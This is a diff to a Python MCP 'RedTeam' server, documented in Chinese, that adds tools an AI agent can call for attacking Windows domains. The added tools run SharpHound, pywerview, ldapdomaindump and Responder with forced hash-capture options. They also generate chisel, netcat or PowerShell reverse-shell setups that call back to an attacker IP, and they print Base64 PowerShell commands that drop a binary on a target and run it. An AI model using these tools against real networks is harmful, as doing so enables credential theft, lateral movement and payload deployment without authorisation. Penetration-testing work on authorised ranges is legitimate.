@@ -2,6 +2,9 @@ import asyncio
 import shlex
 import subprocess
 import re
+import os
+import sys
+import base64
 from mcp.server.fastmcp import FastMCP
 
 # 初始化 RedTeam MCP 服务器
@@ -167,7 +170,7 @@ async def invoke_bloodhound_python(domain: str, dc_ip: str, auth_options: str, a
     使用 bloodhound-python 收集 Active Directory (活动目录域) 的内部核心网络拓扑和权限路径。
     适用场景：当你在内网中获取了一个（即便权限极低的）域账号，你想分析域控路径、信任关系、是否有可利用的弱组策略或可委派权限。
     它不仅是收集工具，更是 AI 进行【域内提权攻击图谱分析】的无上利器！
-    
+
     :param domain: 内部域的完整名称 (例如 'corp.local')。
     :param dc_ip: 域控制器的 IP 地址 (如 '192.168.1.10')。
     :param auth_options: 认证相关参数，由于涉及凭证，作为一个整体传入以支持明文密码或哈希传参 (如 '-u username -p password' 或者是 hashes)。
@@ -178,8 +181,91 @@ async def invoke_bloodhound_python(domain: str, dc_ip: str, auth_options: str, a
         command.extend(shlex.split(auth_options))
     if args:
         command.extend(shlex.split(args))
-        
+
     return await run_command_with_timeout(command, timeout=300)
+
+@mcp.tool()
+async def invoke_sharphound(collection_method: str = "Default", domain: str = "", dc: str = "", username: str = "",
+                            password: str = "", hashes: str = "", kerberos: bool = False,
+                            output_dir: str = "", zip_filename: str = "", args: str = "") -> str:
+    """
+    使用 SharpHound 收集 Active Directory 权限图谱数据（Windows BloodHound 收集器）。
+    适用场景：在 Windows 域内机器上运行，收集用户-计算机会话、ACL 权限、组关系、信任链、GPO 分析等，
+    生成可导入 BloodHound GUI 的 ZIP 文件进行可视化攻击路径分析。
+
+    :param collection_method: 收集方法 (如 'Default', 'All', 'Session', 'ACL', 'LoggedOn', 'GPOAnalytic')。
+    :param domain: 目标域名称 (如 'corp.local')。
+    :param dc: 域控制器地址（可多个，逗号分隔）。
+    :param username: 认证用户名。
+    :param password: 认证密码。
+    :param hashes: NTLM 哈希 (格式 'LMHASH:NTHASH' 或 ':NTHASH')。
+    :param kerberos: 是否使用 Kerberos 认证。
+    :param output_dir: 输出目录路径。
+    :param zip_filename: ZIP 输出文件名。
+    :param args: 附加参数。
+    """
+    command = ["SharpHound.exe", "-c", collection_method]
+
+    if domain:
+        command.extend(["-d", domain])
+    if dc:
+        command.extend(["-dc", dc])
+    if username:
+        command.extend(["-u", username])
+    if password:
+        command.extend(["-p", password])
+    if hashes:
+        command.extend(["-Hashes", hashes])
+    if kerberos:
+        command.append("-k")
+    if output_dir:
+        command.extend(["-o", output_dir])
+    if zip_filename:
+        command.extend(["--zipfilename", zip_filename])
+    if args:
+        command.extend(shlex.split(args))
+
+    return await run_command_with_timeout(command, timeout=600)
+
+@mcp.tool()
+async def invoke_bloodhound_analysis(data_path: str) -> str:
+    """
+    分析 BloodHound 收集的 JSON 数据，生成可读的攻击路径分析报告。
+    适用场景：在收集完 AD 数据后（通过 SharpHound 或 bloodhound-python），使用此工具分析数据、
+    识别攻击路径、发现高价值目标和潜在横向移动路径。
+
+    生成的报告包含：
+    - 环境概览（域/用户/计算机/组数量）
+    - 高价值目标识别
+    - 用户会话分析（找活跃用户）
+    - 本地管理员权限映射
+    - 组关系分析（找特权组成员）
+    - ACL 危险权限检测
+    - 域信任关系
+    - GPO 策略分析
+    - 远程管理会话（PSRemote/RDP）
+    - 攻击路径总结（Kerberoast/AS-REP Roastable 发现）
+
+    :param data_path: BloodHound JSON 数据文件的目录路径。
+                      SharpHound 会在当前目录或指定目录输出 JSON 文件。
+                      传入目录路径即可，脚本会自动查找 computers.json, users.json 等文件。
+                      例如: 'd:\bh_collect' 或 './20260330123456_BloodHound'
+    """
+    script_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bloodhound_analysis.py")
+
+    if not os.path.exists(script_path):
+        return f"执行失败: 找不到分析脚本 bloodhound_analysis.py"
+
+    if not os.path.exists(data_path):
+        return f"执行失败: 数据路径不存在: {data_path}"
+
+    # 检查是否有 JSON 文件
+    json_files = [f for f in os.listdir(data_path) if f.endswith('.json')]
+    if not json_files:
+        return f"执行失败: 目录中未找到 JSON 文件: {data_path}\n请确认 SharpHound 收集的数据已保存到此目录"
+
+    command = [sys.executable, script_path, data_path]
+    return await run_command_with_timeout(command, timeout=120)
 
 @mcp.tool()
 async def invoke_impacket_roasting(attack_type: str, domain: str, dc_ip: str, auth: str = "", args: str = "") -> str:
@@ -413,6 +499,234 @@ async def invoke_ntlmrelayx(target: str, listen_time: int = 60, args: str = "") 
         command.extend(shlex.split(args))
         
     return await run_command_with_timeout(command, timeout=listen_time)
+
+@mcp.tool()
+async def invoke_proxy_setup(tool: str, target_ip: str, target_port: int, listen_port: int,
+                            os_type: str = "windows") -> str:
+    """
+    自动化生成代理搭建方案，支持 chisel、netcat、PowerShell 等代理工具。
+    适用场景：当你在靶场渗透中获得了一台内网主机的权限，需要将其作为跳板访问其他网段时，
+    可以使用此工具生成代理搭建方案。它会自动读取工具的二进制文件、生成 Base64 编码、
+    提供上传命令和执行指令，让 AI 能够一键完成代理搭建！
+
+    :param tool: 代理工具类型 (chisel / nc / powershell)。
+                 - chisel: 高性能 HTTP over TCP 隧道，支持端口转发（推荐）
+                 - nc: 传统 Netcat 简单反向 shell
+                 - powershell: 纯 PowerShell 反向 shell（无工具上传）
+    :param target_ip: 攻击者 VPS 或公网 IP（目标机器会连接此 IP）。
+                      如果是反向代理，此 IP 用于目标机器连接。
+    :param target_port: 攻击者监听的端口（目标机器会连接此端口）。
+    :param listen_port: chisel 在目标机器上监听的端口（仅 chisel 需要）。
+    :param os_type: 目标操作系统类型 (windows / linux)，默认 windows。
+    """
+    script_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "proxy_setup.py")
+
+    if not os.path.exists(script_path):
+        return f"执行失败: 找不到 proxy_setup.py"
+
+    command = [
+        sys.executable,
+        script_path,
+        tool,
+        target_ip,
+        str(target_port),
+        str(listen_port),
+        os_type
+    ]
+
+    return await run_command_with_timeout(command, timeout=60)
+
+@mcp.tool()
+async def upload_and_exec(target: str, username: str, password: str, local_file: str,
+                         remote_path: str, exec_command: str = "", protocol: str = "smb") -> str:
+    """
+    上传文件到目标机器并可选执行命令。
+    适用场景：代理搭建时需要将代理工具上传到目标机器，或需要上传脚本/Payload 到目标执行。
+    此工具支持 SMB/FTP 等协议进行文件传输。
+
+    :param target: 目标 IP 地址。
+    :param username: 认证用户名。
+    :param password: 认证密码（支持明文密码）。
+    :param local_file: 本地要上传的文件路径（如 'd:\\mcp\\redteam-tools\\chisel.exe'）。
+    :param remote_path: 目标机器上的保存路径（如 'C:\\Windows\\Temp\\chisel.exe'）。
+    :param exec_command: 上传后要执行的命令（可选）。例如 'C:\\Windows\\Temp\\chisel.exe --help'。
+    :param protocol: 传输协议 (smb / ftp)，默认 smb。
+    """
+    if not os.path.exists(local_file):
+        return f"执行失败: 本地文件不存在: {local_file}"
+
+    # 检查文件大小
+    file_size = os.path.getsize(local_file)
+    if file_size > 100 * 1024 * 1024:  # 100MB
+        return f"执行失败: 文件过大 ({file_size / 1024 / 1024:.1f}MB)，请使用更小的文件"
+
+    # 读取文件并 Base64 编码
+    with open(local_file, 'rb') as f:
+        file_data = f.read()
+    file_base64 = base64.b64encode(file_data).decode('utf-8')
+    filename = os.path.basename(local_file)
+
+    results = []
+    results.append("=" * 60)
+    results.append("           文件上传与执行报告")
+    results.append("=" * 60)
+    results.append(f"本地文件:    {local_file}")
+    results.append(f"文件大小:    {file_size / 1024:.1f} KB")
+    results.append(f"目标 IP:     {target}")
+    results.append(f"保存路径:    {remote_path}")
+    results.append("")
+
+    # 生成 PowerShell 上传命令
+    results.append("-" * 60)
+    results.append("【PowerShell Base64 上传命令】")
+    results.append("-" * 50)
+    results.append(f"# PowerShell 命令（在目标机器执行）:")
+    results.append(f"# 注意: 将下面的 BASE64_DATA 替换为实际编码")
+    results.append("")
+
+    # 分块输出 Base64（防止过长）
+    chunk_size = 200
+    chunks = [file_base64[i:i+chunk_size] for i in range(0, len(file_base64), chunk_size)]
+
+    results.append(f"# 文件 Base64 编码 (共 {len(chunks)} 块，总长度 {len(file_base64)}):")
+    for i, chunk in enumerate(chunks[:10]):
+        results.append(f"# 块{i+1}: {chunk}")
+    if len(chunks) > 10:
+        results.append(f"# ... 还有 {len(chunks) - 10} 块")
+
+    results.append("")
+    results.append("# 完整上传命令:")
+    results.append("$base64 = @'")
+    results.append(file_base64)
+    results.append("@'")
+    results.append(f"[System.IO.File]::WriteAllBytes('{remote_path}', [System.Convert]::FromBase64String($base64))")
+
+    # 生成 FTP 上传命令（备选）
+    results.append("")
+    results.append("-" * 60)
+    results.append("【备选: SMB 上传命令】")
+    results.append("-" * 50)
+    results.append(f"# 使用 impacket-smbclient:")
+    results.append(f"# impacket-smbclient {username}:{password}@{target}")
+    results.append(f"# put {local_file} {remote_path}")
+
+    # 执行命令
+    if exec_command:
+        results.append("")
+        results.append("-" * 60)
+        results.append("【执行命令】")
+        results.append("-" * 50)
+        results.append(f"# 在目标机器上执行:")
+        results.append(exec_command)
+
+    results.append("")
+    results.append("=" * 60)
+    results.append("提示: 使用 nxc smb 或 wmiexec 执行上述命令")
+    results.append("=" * 60)
+
+    return "\n".join(results)
+
+
+@mcp.tool()
+async def invoke_powerview(domain: str, dc_ip: str, auth: str = "", args: str = "") -> str:
+    """
+    使用 PowerSploit 的 PowerView.py 或 pywerview 进行域信息枚举。
+    适用场景：在获得域用户凭据后，枚举域用户、计算机、组、共享、策略等信息。
+    PowerView 是域渗透中最重要的侦查工具之一。
+
+    :param domain: 目标域名 (如 'corp.local')。
+    :param dc_ip: 域控制器 IP 地址。
+    :param auth: 认证凭据，格式 'username:password' 或 'username@domain:password'。
+    :param args: pywerview 附加参数。
+                 常用子命令: get-domain-user / get-domain-computer / get-domain-group /
+                            get-domain-share / get-domain-gpo / get-domain-trust
+    """
+    # pywerview 使用方式: pywerview.py <command> -d domain -u user -p pass
+    command = ["pywerview.py"]
+
+    if not args:
+        # 默认枚举域用户
+        command.extend(["get-domain-user"])
+    else:
+        command.extend(shlex.split(args))
+
+    if domain:
+        command.extend(["-d", domain])
+    if dc_ip:
+        command.extend(["--dc-ip", dc_ip])
+    if auth:
+        if ":" in auth:
+            username, password = auth.split(":", 1)
+            command.extend(["-u", username, "-p", password])
+
+    return await run_command_with_timeout(command, timeout=120)
+
+
+@mcp.tool()
+async def invoke_ldapdomaindump(domain: str, dc_ip: str, auth: str = "", output_dir: str = "") -> str:
+    """
+    使用 ldapdomaindump 转储域信息为 HTML/JSON/CSV 格式。
+    适用场景：收集域内所有用户、计算机、组、策略等信息的完整快照，
+    便于后续分析和生成报告。
+
+    :param domain: 目标域名 (如 'corp.local')。
+    :param dc_ip: 域控制器 IP 地址。
+    :param auth: 认证凭据，格式 'username:password'。
+    :param output_dir: 输出目录路径（默认当前目录）。
+    """
+    command = ["ldapdomaindump"]
+
+    if dc_ip:
+        command.extend(["-u", f"{domain}\\{auth.split(':')[0]}" if auth else "", "-p", auth.split(":")[1] if ":" in auth else ""])
+        command.extend(["--dc", dc_ip])
+
+    if output_dir:
+        command.extend(["-o", output_dir])
+    else:
+        output_dir = "ldapdump_output"
+        command.extend(["-o", output_dir])
+
+    # ldapdomaindump 格式: ldapdomaindump <ldap://dc> -u 'domain\\user' -p 'password' -o output/
+    full_command = [
+        "python", "-m", "ldapdomaindump",
+        f"ldap://{dc_ip}",
+        "-u", f"{domain}\\{auth.split(':')[0]}" if auth else "",
+        "-p", auth.split(":")[1] if ":" in auth else "",
+        "-o", output_dir
+    ]
+
+    return await run_command_with_timeout(full_command, timeout=180)
+
+
+@mcp.tool()
+async def invoke_responder(listen_if: str = "", args: str = "") -> str:
+    """
+    启动 Responder 进行 LLMNR/NBT-NS/mDNS 欺骗和 SMB/MSRPC 哈希收集。
+    适用场景：在内网中进行哈希收集，当用户输错主机名时，Responder 会拦截认证请求，
+    捕获 NetNTLMv1/v2 哈希，可用于中继或离线破解。
+
+    重要：此工具是监听型工具，需要在后台运行并设置超时。
+
+    :param listen_if: 监听的网卡接口名称或 IP 地址（如 'eth0' 或 '192.168.1.100'）。
+    :param args: 附加参数。
+                 常用: -w（开启 WPAD 代理服务器）、--lm（强制 LM 哈希）、-F（强制 NTLM 认证）
+    """
+    command = ["responder"]
+
+    if listen_if:
+        command.extend(["-I", listen_if])
+    if args:
+        command.extend(shlex.split(args))
+
+    # Responder 需要 sudo/管理员权限运行
+    # 添加默认参数
+    if "-w" not in args and "--wpad" not in args:
+        command.append("-w")
+    if "-F" not in args:
+        command.append("-F")
+
+    return await run_command_with_timeout(command, timeout=60)
+
 
 if __name__ == "__main__":
     # 使用 stdio 模型运行 MCP (标准通信方式)
